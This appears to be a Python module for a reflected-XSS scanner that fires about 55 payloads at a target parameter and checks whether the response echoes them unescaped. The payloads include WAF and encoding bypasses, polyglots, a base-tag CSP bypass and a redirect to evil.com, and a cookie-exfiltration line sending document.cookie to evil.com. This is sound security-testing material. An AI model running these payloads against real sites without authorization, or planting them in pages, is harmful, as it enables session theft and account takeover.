"""test_xss() — Reflected Cross-Site Scripting (XSS) detection.

PURPOSE
-------
Detects reflected XSS vulnerabilities by injecting a comprehensive suite of
payloads into a specified HTTP parameter and checking whether the payload
appears **unescaped** in the response body.

HOW IT WORKS
------------
1. For each payload in the list, the tool injects it into the target parameter
   (via query string for GET or URL-encoded body for POST).
2. Sends the request using ``httpx`` (with session cookies if authenticated).
3. Checks if the payload's detection string appears **unmodified** in the
   response — indicating the input was reflected without sanitization.
4. Also checks for signs of encoding/sanitization (HTML entities, URL encoding)
   to report when the app *is* filtering but potentially incompletely.

PAYLOAD CATEGORIES (~55 payloads)
---------------------------------
- **Basic script/tag injection** — ``<script>``, ``<img onerror>``, ``<svg onload>``
- **Attribute breakout** — escaping from ``"`` and ``'`` quoted attributes
- **Event handler injection** — ``onfocus``, ``onload``, ``onerror``, ``onmouseover``, etc.
- **WAF bypass techniques** — case mixing, null bytes, tag nesting, double encoding
- **Encoding bypasses** — ``String.fromCharCode``, Unicode escapes, hex entities
- **Polyglot payloads** — single payloads that work across HTML/JS/attribute contexts
- **Modern HTML5 tags** — ``<video>``, ``<audio>``, ``<details>``, ``<object>``, ``<embed>``
- **DOM-based indicators** — payloads targeting ``document.write``, ``innerHTML``
- **Protocol handler injection** — ``javascript:`` URIs
- **CSP bypass attempts** — ``<base>`` tag injection, ``<meta>`` redirect
- **Reflection probe** — harmless unique marker to confirm reflection exists

WHEN TO USE
-----------
- After discovering routes with ``find_routes()`` that have query parameters
  or form inputs.
- Test each user-controlled parameter individually.
- For GET parameters: provide the full URL with query string.
- For POST forms: provide the URL and the form body in ``data``.
"""

import json
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.http_client import get_client

# ---------------------------------------------------------------------------
# XSS payloads — comprehensive list for maximum detection coverage
# ---------------------------------------------------------------------------

XSS_PAYLOADS: list[dict] = [
    # ==================== Basic script/tag injection ====================
    {
        "payload": "<script>alert('XSS')</script>",
        "check": "<script>alert('XSS')</script>",
        "context": "HTML body — classic script injection",
    },
    {
        "payload": "<script>alert(document.domain)</script>",
        "check": "<script>alert(document.domain)</script>",
        "context": "HTML body — domain exfiltration",
    },
    {
        "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
        "check": "<script>alert(String.fromCharCode(88,83,83))</script>",
        "context": "HTML body — CharCode to avoid quote filters",
    },
    {
        "payload": "<img src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Img tag — event handler via broken src",
    },
    {
        "payload": "<svg onload=alert('XSS')>",
        "check": "<svg onload=alert('XSS')>",
        "context": "SVG tag — onload event",
    },
    {
        "payload": "<svg/onload=alert('XSS')>",
        "check": "onload=alert('XSS')",
        "context": "SVG tag — no space (WAF bypass)",
    },

    # ==================== Attribute breakout ====================
    {
        "payload": "\"><script>alert('XSS')</script>",
        "check": "<script>alert('XSS')</script>",
        "context": "Double-quote attribute breakout",
    },
    {
        "payload": "'><script>alert('XSS')</script>",
        "check": "<script>alert('XSS')</script>",
        "context": "Single-quote attribute breakout",
    },
    {
        "payload": "\"><img src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Attribute breakout into img tag",
    },
    {
        "payload": "' autofocus onfocus=alert('XSS') x='",
        "check": "onfocus=alert('XSS')",
        "context": "Single-quote attribute injection with autofocus",
    },

    # ==================== Event handlers ====================
    {
        "payload": "\" onfocus=alert('XSS') autofocus=\"",
        "check": "onfocus=alert('XSS')",
        "context": "Event handler injection via onfocus",
    },
    {
        "payload": "<body onload=alert('XSS')>",
        "check": "<body onload=alert('XSS')>",
        "context": "Body onload event",
    },
    {
        "payload": "<input onfocus=alert('XSS') autofocus>",
        "check": "onfocus=alert('XSS')",
        "context": "Input autofocus trick",
    },
    {
        "payload": "<select onfocus=alert('XSS') autofocus>",
        "check": "onfocus=alert('XSS')",
        "context": "Select element autofocus",
    },
    {
        "payload": "<textarea onfocus=alert('XSS') autofocus>",
        "check": "onfocus=alert('XSS')",
        "context": "Textarea autofocus",
    },
    {
        "payload": "<details open ontoggle=alert('XSS')>",
        "check": "ontoggle=alert('XSS')",
        "context": "Details/ontoggle (HTML5)",
    },
    {
        "payload": "<marquee onstart=alert('XSS')>",
        "check": "onstart=alert('XSS')",
        "context": "Marquee onstart",
    },
    {
        "payload": "<div onmouseover=alert('XSS')>hover me</div>",
        "check": "onmouseover=alert('XSS')",
        "context": "Div onmouseover",
    },

    # ==================== Modern HTML5 element payloads ====================
    {
        "payload": "<video src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Video tag with onerror",
    },
    {
        "payload": "<video><source onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Video source element onerror",
    },
    {
        "payload": "<audio src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Audio tag with onerror",
    },
    {
        "payload": "<object data=\"javascript:alert('XSS')\">",
        "check": "javascript:alert('XSS')",
        "context": "Object tag with javascript URI",
    },
    {
        "payload": "<embed src=\"javascript:alert('XSS')\">",
        "check": "javascript:alert('XSS')",
        "context": "Embed tag with javascript URI",
    },
    {
        "payload": "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert('XSS') src=1>\">",
        "check": "onerror=alert('XSS')",
        "context": "Math/SVG namespace confusion",
    },

    # ==================== Protocol handler injection ====================
    {
        "payload": "javascript:alert('XSS')",
        "check": "javascript:alert('XSS')",
        "context": "JavaScript protocol in href/src",
    },
    {
        "payload": "<iframe src=\"javascript:alert('XSS')\">",
        "check": "javascript:alert('XSS')",
        "context": "Iframe with javascript src",
    },
    {
        "payload": "<a href=\"javascript:alert('XSS')\">click</a>",
        "check": "javascript:alert('XSS')",
        "context": "Anchor tag javascript href",
    },

    # ==================== Encoding bypasses ====================
    {
        "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "check": "onerror=alert(String.fromCharCode(88,83,83))",
        "context": "CharCode encoding bypass",
    },
    {
        "payload": "<img src=x onerror=\\u0061lert('XSS')>",
        "check": "\\u0061lert('XSS')",
        "context": "Unicode escape in event handler",
    },
    {
        "payload": "<img src=x onerror=&#97;lert('XSS')>",
        "check": "&#97;lert('XSS')",
        "context": "HTML entity encoding bypass",
    },
    {
        "payload": "<img src=x onerror=&#x61;lert('XSS')>",
        "check": "&#x61;lert('XSS')",
        "context": "Hex HTML entity bypass",
    },

    # ==================== WAF bypass techniques ====================
    {
        "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
        "check": "<ScRiPt>alert('XSS')</ScRiPt>",
        "context": "Case mixing bypass",
    },
    {
        "payload": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "check": "alert('XSS')",
        "context": "Nested tag bypass (filter strips inner <script>)",
    },
    {
        "payload": "<img/src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Slash instead of space (WAF bypass)",
    },
    {
        "payload": "<img\tsrc=x\tonerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Tab character as separator",
    },
    {
        "payload": "<img src=x onerror=alert`XSS`>",
        "check": "onerror=alert`XSS`",
        "context": "Backtick instead of parentheses",
    },
    {
        "payload": "<<script>alert('XSS')//<</script>",
        "check": "alert('XSS')",
        "context": "Double angle bracket confusion",
    },
    {
        "payload": "<svg><script>alert&#40;'XSS'&#41;</script></svg>",
        "check": "alert&#40;'XSS'&#41;",
        "context": "SVG context with HTML entities in script",
    },
    {
        "payload": "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
        "check": "onerror=eval(src)",
        "context": "Eval-based indirect execution",
    },

    # ==================== Polyglot payloads ====================
    {
        "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik11telerik22telerik33\\x3csVg/telerik44/oNloAd=alert()//>",
        "check": "oNcliCk=alert()",
        "context": "Polyglot — multi-context XSS (Ashar Javed style)",
    },
    {
        "payload": "'\"><img src=x onerror=alert(1)>",
        "check": "onerror=alert(1)",
        "context": "Polyglot — breaks out of both quote types + img",
    },
    {
        "payload": "'-alert('XSS')-'",
        "check": "-alert('XSS')-",
        "context": "JavaScript string context breakout",
    },
    {
        "payload": "\\'-alert('XSS')//",
        "check": "-alert('XSS')//",
        "context": "Escaped single quote JS breakout",
    },

    # ==================== Template literal / backtick ====================
    {
        "payload": "${alert('XSS')}",
        "check": "${alert('XSS')}",
        "context": "Template literal injection",
    },
    {
        "payload": "`><img src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "Backtick breakout into HTML",
    },

    # ==================== CSP bypass attempts ====================
    {
        "payload": "<base href=\"https://evil.com/\">",
        "check": "<base href=",
        "context": "Base tag injection (CSP bypass via relative URLs)",
    },
    {
        "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
        "check": "javascript:alert('XSS')",
        "context": "Meta refresh with javascript URI",
    },

    # ==================== DOM-based XSS indicators ====================
    {
        "payload": "<img src=x onerror=document.write('XSS')>",
        "check": "onerror=document.write('XSS')",
        "context": "document.write via event handler",
    },
    {
        "payload": "<img src=x onerror=this.ownerDocument.location='//evil.com'>",
        "check": "onerror=this.ownerDocument.location=",
        "context": "Location redirect via event handler",
    },
    {
        "payload": "\"><svg onload=fetch('//evil.com/'+document.cookie)>",
        "check": "onload=fetch(",
        "context": "Cookie exfiltration via fetch",
    },

    # ==================== Reflection probe (harmless) ====================
    {
        "payload": "vntg3x55t3st",
        "check": "vntg3x55t3st",
        "context": "Reflection probe — harmless unique marker to confirm input is reflected",
    },

    # ==================== Data URI ====================
    {
        "payload": "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
        "check": "data:text/html,<script>alert('XSS')</script>",
        "context": "Data URI in object tag",
    },
    {
        "payload": "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
        "check": "data:text/html,<script>alert('XSS')</script>",
        "context": "Data URI in iframe src",
    },
]

# Patterns indicating the response might be encoding/sanitizing input
ENCODING_PATTERNS = [
    (re.compile(r"&lt;script", re.I), "HTML entity encoding (<)"),
    (re.compile(r"&gt;", re.I), "HTML entity encoding (>)"),
    (re.compile(r"&#x3C;|&#60;", re.I), "Numeric HTML encoding (<)"),
    (re.compile(r"%3C|%3E", re.I), "URL encoding"),
    (re.compile(r"&amp;", re.I), "HTML entity encoding (&)"),
    (re.compile(r"&quot;", re.I), "HTML entity encoding (\")"),
    (re.compile(r"&#x27;|&#39;", re.I), "HTML entity encoding (')"),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Inject payload into query-string parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _inject_body(data: str, param: str, payload: str) -> str:
    """Inject payload into URL-encoded POST body."""
    params = parse_qs(data, keep_blank_values=True)
    params[param] = [payload]
    return urlencode(params, doseq=True)


async def test_xss(
    url: str,
    param: str,
    method: str = "GET",
    data: str = "",
) -> str:
    """Test a parameter for reflected Cross-Site Scripting (XSS) vulnerabilities.

    Injects ~55 XSS payloads covering multiple attack contexts (HTML body,
    attributes, JavaScript, event handlers, SVG/MathML, protocol handlers,
    WAF bypasses, encoding tricks, polyglots, and CSP bypass attempts) into
    the specified parameter and checks if they are reflected in the response
    without proper encoding or sanitization.

    Session cookies from a prior ``authenticate()`` call are automatically
    included so that authenticated pages can be tested.

    Args:
        url: The target URL (for GET, include query string with the param,
            e.g., http://example.com/search?q=test).
        param: The parameter name to inject XSS payloads into (e.g., "q").
        method: HTTP method — "GET" or "POST" (default "GET").
        data: URL-encoded POST body (only for POST method,
            e.g., "q=test&page=1").

    Returns:
        JSON string with:
        - ``vulnerable_findings``: Count of payloads reflected unescaped.
        - ``reflected_but_encoded``: Count of payloads reflected but sanitized.
        - ``sanitization_detected``: What encoding types were observed.
        - ``findings``: Detailed list of each successful payload with context.
    """
    method = method.upper()
    findings: list[dict] = []
    sanitization_detected: list[str] = []
    reflected_but_encoded = 0

    async with get_client(follow_redirects=True, verify_ssl=False) as client:
        for entry in XSS_PAYLOADS:
            payload = entry["payload"]
            check = entry["check"]
            context = entry["context"]

            try:
                if method == "GET":
                    test_url = _inject_param(url, param, payload)
                    resp = await client.get(test_url)
                else:
                    injected = _inject_body(data, param, payload)
                    resp = await client.post(
                        url,
                        content=injected,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )

                body = resp.text

                # Check if payload is reflected unescaped
                if check in body:
                    findings.append({
                        "payload": payload,
                        "context": context,
                        "status_code": resp.status_code,
                        "reflected_unescaped": True,
                        "vulnerable": True,
                    })
                else:
                    # Check if it's reflected but encoded
                    for pat, encoding_type in ENCODING_PATTERNS:
                        if pat.search(body) and payload.replace("<", "").replace(">", "")[:10] in body.lower():
                            reflected_but_encoded += 1
                            if encoding_type not in sanitization_detected:
                                sanitization_detected.append(encoding_type)
                            break

            except Exception:
                continue

    vulnerable_count = sum(1 for f in findings if f.get("vulnerable"))

    return json.dumps({
        "target": url,
        "param": param,
        "method": method,
        "total_payloads_tested": len(XSS_PAYLOADS),
        "vulnerable_findings": vulnerable_count,
        "reflected_but_encoded": reflected_but_encoded,
        "sanitization_detected": sanitization_detected,
        "findings": findings,
    }, indent=2)
